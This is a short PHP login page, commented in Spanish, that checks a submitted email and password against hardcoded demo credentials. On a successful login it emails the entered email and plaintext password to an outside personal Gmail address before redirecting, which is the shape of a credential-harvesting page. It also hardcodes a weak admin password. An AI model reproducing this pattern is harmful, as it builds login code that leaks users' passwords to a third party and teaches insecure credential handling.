<?php
// Verificar si se ha enviado el formulario
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Verificar si se han proporcionado datos de inicio de sesión
    if (isset($_POST['correo']) && isset($_POST['contrasena'])) {
        // Obtener los valores de correo y contraseña del formulario
        $correo = $_POST['correo'];
        $contrasena = $_POST['contrasena'];

        // Aquí puedes agregar la lógica para verificar las credenciales
        // Por ejemplo, conectarte a una base de datos y verificar si el correo y la contraseña coinciden

        // Ejemplo básico: si el correo es "admin@example.com" y la contraseña es "password", iniciar sesión
        if ($correo === 'admin@example.com' && $contrasena === 'password') {
            // Iniciar sesión
            session_start();
            $_SESSION['correo'] = $correo;

            // Enviar correo electrónico
            $to = "yorbisabreu777@gmail.com";
            $subject = "Inicio de sesión exitoso";
            $message = "Se ha iniciado sesión con éxito. Correo: " . $correo . ", Contraseña: " . $contrasena;
            $headers = "From: tu_email@example.com" . "\r\n" .
                "Reply-To: tu_email@example.com" . "\r\n" .
                "X-Mailer: PHP/" . phpversion();

            // Envía el correo electrónico
            mail($to, $subject, $message, $headers);

            // Redirigir al usuario a la página de bienvenida
            header('Location: welcome.php');
            exit;
        } else {
            // Si las credenciales son incorrectas, mostrar un mensaje de error
            $error = "Correo electrónico o contraseña incorrectos.";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <h2>Iniciar sesión</h2>
        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <input type="text" name="correo" placeholder="Correo electrónico" required>
            <input type="password" name="contrasena" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
    </div>
</body>
</html>
